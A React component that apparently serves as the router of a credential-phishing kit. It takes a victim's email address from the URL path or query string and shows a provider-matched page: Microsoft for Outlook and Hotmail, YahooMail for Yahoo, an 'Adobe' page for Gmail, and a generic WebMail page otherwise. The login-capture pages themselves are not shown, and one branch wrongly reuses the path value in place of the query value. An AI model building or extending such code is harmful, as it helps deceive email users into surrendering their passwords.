import React, { useEffect, useState } from 'react'
import { useParams, useSearchParams } from 'react-router-dom';
import Microsoft from './ms';
import YahooMail from './YahooMail';
import Adobe from './Adobe';
import WebMail from './webmail';

const SortPage = () => {
  const [currentPage, setCurrentPage] = useState(null)
  const param = useParams();
  const [searchParams] = useSearchParams();
  const value = searchParams.get('id');

  const checkUrl = ()=> {
    if(!param.id){
      setCurrentPage(<WebMail />);
    }else{
      if(param.id.split('@')[1] === 'outlook.com' || param.id.split('@')[1] === 'hotmail.com'){
        setCurrentPage(<Microsoft />);
      }
      if(param.id.split('@')[1] === 'yahoo.com' || param.id.split('@')[1] === 'yahoomail.com'){
        setCurrentPage(<YahooMail />);
      }
      if(param.id.split('@')[1] === 'gmail.com' || param.id.split('@')[1] === 'google.com'){
        setCurrentPage(<Adobe />);
      }
    }

    if(!value){
      setCurrentPage(<WebMail />);
    }else{
      if(value.split('@')[1] === 'outlook.com' || value.split('@')[1] === 'hotmail.com'){
        setCurrentPage(<Microsoft />);
      }
      if(value.split('@')[1] === 'yahoo.com' || value.split('@')[1] === 'yahoomail.com'){
        setCurrentPage(<YahooMail />);
      }
      if(param.id.split('@')[1] === 'gmail.com' || param.id.split('@')[1] === 'google.com'){
        setCurrentPage(<Adobe />);
      }
    }
  }
  useEffect(() => {
    checkUrl();
  }, [])

  return (
    <>
        {currentPage ? currentPage : <WebMail />}
    </>
  )
}

export default SortPage
